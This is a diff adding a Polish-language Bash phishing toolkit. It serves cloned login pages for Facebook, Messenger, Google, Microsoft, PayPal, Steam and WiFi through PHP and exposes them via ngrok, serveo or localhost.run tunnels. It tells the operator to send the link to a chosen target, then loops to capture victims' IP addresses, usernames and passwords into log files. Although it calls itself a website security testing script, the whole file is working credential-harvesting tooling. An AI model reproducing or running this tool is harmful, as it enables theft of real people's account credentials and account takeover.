@@ -1,0 +1,534 @@
+#!/bin/bash
+
+trap 'printf "\n";stop;exit 1' 2
+trap user_interrupt SIGINT
+trap user_interrupt SIGTSTP
+
+user_interrupt(){
+        printf "\e[0m\n"
+        printf "\e[0m\e[1;36m\t Naciśnięto CTRL + C !!\n"
+        sleep 2
+        printf "\e[0m\n"
+        printf " \e[0m\e[1;42m Dziękuję za wybranie mojego skryptu !!\e[0m  \e[1;44m Odwiedź https://github.com/RemovFaller po więcej\e[0m\n"
+        printf "\e[0m\n"
+        exit 1
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+if [[ -e .nexlink ]]; then
+rm -rf .nexlink
+fi
+
+}
+
+reqs() {
+
+command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Brak zainstalowanego pakietu ! Wpisz \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
+command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Brak zainstalowanego pakietu ! Wpisz \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
+command -v ssh > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Brak zainstalowanego pakietu ! Wpisz \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
+command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Brak zainstalowanego pakietu ! Wpisz \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
+
+if [[ -d .remo ]]; then
+printf ""
+else
+printf "\n\e[0m\e[96m Nie znaleziono pakietu ! Wpisz \e[0m\e[93mbash setup\e[0m\n\n"
+exit 1 
+fi
+
+if [[ -d .Modules ]]; then
+printf ""
+else
+printf "\n\e[0m\e[96m Nie znaleziono pakietu ! Wpisz \e[0m\e[93mbash setup\e[0m\n\n"
+exit 1 
+fi
+
+if [[ -d .remo/www ]]; then
+rm -rf .remo/www
+mkdir .remo/www
+else
+mkdir .remo/www
+fi
+
+}
+
+banner() {
+
+clear
+printf "\e[0m\n"
+printf "\e[0m\e[92m  _____    ____  __      __   ______    _______  \e[0m\n"
+printf "\e[0m\e[92m |  _  |  |  __||  \    /  \ |  __  |   |  ____| \e[0m\n"
+printf "\e[0m\e[92m | |_| |  | |__ |   \  /    || |  | |   |  |___  \e[0m\n"
+printf "\e[0m\e[92m |  _  \  |  __|| |\ \/  /| || |  | |   |   ___| \e[0m\n"
+printf "\e[0m\e[92m | | \  \ | |__ | | \   / | || |__| | _ |  |     \e[0m\n"
+printf "\e[0m\e[92m |_|  \__||____||_|  \_/  |_||______||_||__|     \e[0m\e[1;44m[V 1.5]\e[0m\n"
+printf "\e[0m\n"
+printf " \e[0m\e[1;41m Szablony w języku polskim. Skrypt stworzony przez Remo Faller  [BY : R-F ]\e[0m\n"
+printf "\e[0m\n"
+
+}
+
+smallbanner() {
+
+clear
+printf "\e[0m\n"
+printf "\e[0m\e[93m ____  __ _    _ ___      ___  _  _   _   ___  ___ \e[0m\n"
+printf "\e[0m\e[93m |__/ |__ |\  /| |  |  _  |__ /_\ |   |   |__ |__/ \e[0m\n"
+printf "\e[0m\e[93m | \  |__ | \/ | |__| |_| |  /   \|__ |__ |__ | \  \e[0m\e[1;46m[V 1.5]\e[0m\n"
+printf "\e[0m\n"
+printf "    \e[0m\e[1;44m Skrypt do testowania zabezpieczeń stron WWW \e[0m\n"
+printf "\e[0m\n"
+printf "\e[0m\e[91m    [\e[0m\e[96m BY \e[0m\e[91m: \e[0m\e[96mhttps://github.com/RemovFaller \e[0m\e[91m] \e[0m\n"
+printf "\e[0m\n"
+
+}
+
+menu() {
+
+printf "      \e[0m\e[1;46m[::]  Wybierz skrypt do wykonania  [::]\e[0m\n"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook       \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Google  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Microsoft      \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Paypal  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Steam          \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m WiFi  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Własna         \e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;93m O Skrypcie  \e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wybierz opcję: \e[0m\e[1;96m\en' menu_option
+
+if [[ $menu_option == 1 || $menu_option == 01 ]]; then
+facebook
+elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
+gmail
+elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
+website="microsoft"
+tunnel_menu
+elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
+website="paypal"
+tunnel_menu
+elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
+website="steam"
+tunnel_menu
+elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
+website="wifi"
+tunnel_menu
+elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
+website="wlasna"
+tunnel_menu
+elif [[ $menu_option == 99 ]]; then
+website="about"
+tunnel_menu
+elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
+printf "\e[0m\n"
+printf " \e[0m\e[1;42m Dziękuję za wybranie mojego skryptu !!\e[0m  \e[1;44m Odwiedź https://github.com/RemovFaller po więcej\e[0m\n"
+printf "\e[0m\n"
+exit 1
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Nieprawidłowa opcja \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
+
+facebook(){
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Domyślna Strona Logowania\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Strona Logowania Messenger\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wybierz opcję: \e[0m\e[1;96m\en' fb_option
+
+
+if [[ $fb_option == 1 || $fb_option == 01 ]]; then
+website="facebook"
+tunnel_menu
+elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
+website="messenger"
+tunnel_menu
+
+else
+printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Nieprawidłowa operacja \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
+gmail(){
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Logowanie\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Alternatywna Strona Logowania Gmail\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wybierz opcję: \e[0m\e[1;96m\en' gmail_option
+
+
+if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
+website="google"
+tunnel_menu
+elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
+website="google_alt"
+tunnel_menu
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Nieprawidłowa funkcja \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
+custom(){
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Twoja własna strona\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wybierz opcję: \e[0m\e[1;96m\en' custom_option
+
+
+if [[ $custom_option == 1 || $custom_option == 01 ]]; then
+website="wlasna"
+tunnel_menu
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Nieprawidłowa funkcja \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
+
+about() {
+
+clear
+sleep 2
+printf "\e[0m\n"
+printf "\e[0m\e[93m ____  __ _    _ ___      ___  _  _   _   ___  ___ \e[0m\n"
+printf "\e[0m\e[93m |__/ |__ |\  /| |  |  _  |__ /_\ |   |   |__ |__/ \e[0m\n"
+printf "\e[0m\e[93m | \  |__ | \/ | |__| |_| |  /   \|__ |__ |__ | \  \e[0m\e[1;46m[V 1.5]\e[0m\n"
+printf "\e[0m\n"
+printf "    \e[0m\e[1;44m Skrypt do testowania zabezpieczeń stron WWW \e[0m\n"
+printf "\e[0m\n"
+printf "\e[0m\e[91m    [\e[0m\e[96m BY \e[0m\e[91m: \e[0m\e[96mhttps://github.com/RemovFaller \e[0m\e[91m] \e[0m\n"
+printf "\e[0m\n"
+printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/RemovFaller\e[0m\n"
+printf "\e[0m\n"
+printf "\e[0m\n"
+printf "\e[0m\e[92m  Wersja \e[0m\e[91m    : \e[0m\e[93m1.2\e[0m\n"
+printf "\e[0m\n"
+printf "         \e[0m\e[1;44m Sprawdź moje repozytorium GitHub \e[0m\n"
+printf "\e[0m\n"
+printf "\e[0m\n"
+sleep 3
+printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Główna           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Wyjście\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wybierz skrypt: \e[0m\e[1;96m\en' about_option
+
+if [[ $about_option == 0 || $about_option == 00 ]]; then
+sleep 1
+banner
+menu
+elif [[ $about_option == 99 ]]; then
+sleep 1
+printf "\e[0m\n"
+printf " \e[0m\e[1;42m Dziękuję za wybranie mojego skryptu !!\e[0m  \e[1;44m Odwiedź https://github.com/RemovFaller po więcej\e[0m\n"
+printf "\e[0m\n"
+exit 1
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Nieprawidłowa opcja \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+}
+
+tunnel_menu() {
+
+if [[ -e .nexlink ]]; then
+rm -rf .nexlink
+fi
+
+if [[ -d .remo/www ]]; then
+rm -rf .remo/www
+mkdir .remo/www
+else
+mkdir .remo/www
+fi
+
+cp -rf .Modules/$website/* .remo/www
+cp -f .Modules/ip.php .remo/www/
+
+def_tunnel_menu="2"
+smallbanner
+printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m Local Host\e[0m\n"
+printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m NGRok\e[0m\n"
+printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m Local Host Run\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wybierz opcję przesyłu danych: \e[0m\e[1;96m\en' tunnel_menu
+tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
+
+if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
+start_localhost
+elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
+start_ngrok
+elif [[ $tunnel_menu == 5 || $tunnel_menu == 03 ]]; then
+start_localhostrun
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Nieprawidłowa opcja \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
+
+start_localhost() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:80 \e[0m\e[1;92m)\e[0m\n"
+cd .remo/www && php -S 127.0.0.1:80 > /dev/null 2>&1 & 
+sleep 2
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hostowane pod adresem :\e[0m\e[1;93m http://127.0.0.1:80\e[0m\n"
+
+datafound
+
+}
+
+start_ngrok() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:80\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie NGRok ...\e[0m\n"
+cd .remo/www && php -S 127.0.0.1:80 > /dev/null 2>&1 & 
+sleep 2
+./.remo/ngrok http 127.0.0.1:80 > /dev/null 2>&1 &
+sleep 7
+ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Wyślij link do wybranego celu :\e[0m\e[1;93m %s \n" $ngrok_link
+
+datafound
+}
+
+start_serveo() {
+
+serveo_default_choose_sub="Y"
+serveo_default_sub="$website$RANDOM"
+serveo_def_port="80"
+
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wybierz opcję przesyłu danych \e[0m\e[1;91m( \e[0m\e[1;92mDomyślne:\e[0m\e[1;96m %s \e[0m\e[1;91m )\e[0m\e[1;92m : \e[0m\e[1;93m' $serveo_def_port
+read serveo_port
+serveo_port="${serveo_port:-${serveo_def_port}}"
+sleep 1
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wygenerować losowy adres URL ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
+read serveo_choose_sub
+serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
+if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
+serveo_custom_subdomain=true
+sleep 1
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wpisz WŁASNĄ subdomenę : \e[0m\e[1;91m( \e[0m\e[1;92mDomyślna:\e[0m\e[1;93m %s \e[0m\e[1;91m)\e[0m\e[1;92m: \e[0m\e[1;93m' $serveo_default_sub
+read serveo_subdomain
+serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
+sleep 1
+fi
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:$serveo_port\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie Serveo ...\e[0m\n"
+cd .remo/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
+if [[ $serveo_custom_subdomain == true ]]; then
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
+sleep 7
+
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
+sleep 7
+fi
+serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Wyślij link do wybranego celu :\e[0m\e[1;93m %s \n" $serveo_link
+
+datafound
+}
+
+start_loclx() {
+
+loclx_default_choose_sub="Y"
+loclx_default_sub="$website$RANDOM"
+
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wygenerować losowy adres URL ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
+read loclx_choose_sub
+loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
+if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
+loclx_custom_subdomain=true
+sleep 1
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wpisz WŁASNĄ subdomenę : \e[0m\e[1;91m( \e[0m\e[1;92mDomyślna:\e[0m\e[1;93m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
+read loclx_subdomain
+loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
+sleep 1
+fi
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie tunelowania lokalnego ...\e[0m\n"
+cd .remo/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
+if [[ $loclx_custom_subdomain == true ]]; then
+
+./.remo/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &
+
+sleep 8
+
+else
+./.remo/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
+sleep 8
+fi
+loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Wyślij link do wybranego celu :\e[0m\e[1;93m %s \n" $loclx_link
+
+datafound
+}
+
+start_localhostrun() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie Local Host Run ...\e[0m\n"
+cd .remo/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Uruchamianie...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Naciśnij Ctrl+C aby wyświetlić wyniki \e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
+ssh -R 80:localhost:4545 ssh.localhost.run
+
+printf "\e[0m\n"
+
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;93m Dane logowania \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
+printf "\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e ".remo/www/ip.txt" ]]; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Znaleziono IP celu !\e[0m\n"
+grab_ip
+rm -rf .remo/www/ip.txt
+fi
+sleep 0.75
+if [[ -e ".remo/www/usernames.txt" ]]; then
+account=$(grep -o 'Użytkownik:.*' .remo/www/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Hasło:.*' .remo/www/usernames.txt | cut -d ":" -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Konto:\e[0m\e[1;96m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hasło:\e[0m\e[1;96m %s\n\e[0m" $password
+cat .remo/www/usernames.txt >> logs/$website.log
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Zapisano:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Naciśnij Ctrl + C aby wyjść\e[0m\n"
+rm -rf .remo/www/usernames.txt
+fi
+sleep 0.75
+
+done
+
+}
+
+grab_ip() {
+
+ip=$(grep -a 'IP:' .remo/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Adres IP celu :\e[0m\e[1;96m %s\e[0m\n" $ip
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Zapisano:\e[0m\e[1;93m ip.txt\e[0m\n" $server
+printf "\n"
+cat .remo/www/ip.txt >> ip.txt
+
+}
+
+grab_creds() {
+
+account=$(grep -o 'Użytkownik:.*' .remo/www/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Hasło:.*' .remo/www/usernames.txt | cut -d ":" -f2)
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Konto:\e[0m\e[1;96m %s\n\e[0m" $account
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hasło:\e[0m\e[1;96m %s\n\e[0m" $password
+cat .remo/www/usernames.txt >> logs/$website.log
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Zapisano:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Oczekiwanie na następne informacje,\e[0m\e[1;96m Ctrl + C aby wyjść.\e[0m\n"
+
+}
+
+datafound() {
+
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Oczekiwanie na informacje zwrotne,\e[0m\e[1;96m Ctrl + C aby wyjść.\e[0m\n"
+printf "\n"
+while [ true ]; do
+
+
+if [[ -e ".remo/www/ip.txt" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Znaleziono cel !\e[0m\n"
+grab_ip
+rm -rf .remo/www/ip.txt
+fi
+sleep 0.75
+if [[ -e ".remo/www/usernames.txt" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Wykryto dane logowania !!\e[0m\n"
+grab_creds
+rm -rf .remo/www/usernames.txt
+fi
+sleep 0.75
+
+
+done 
+
+}
+
+banner
+reqs
+menu
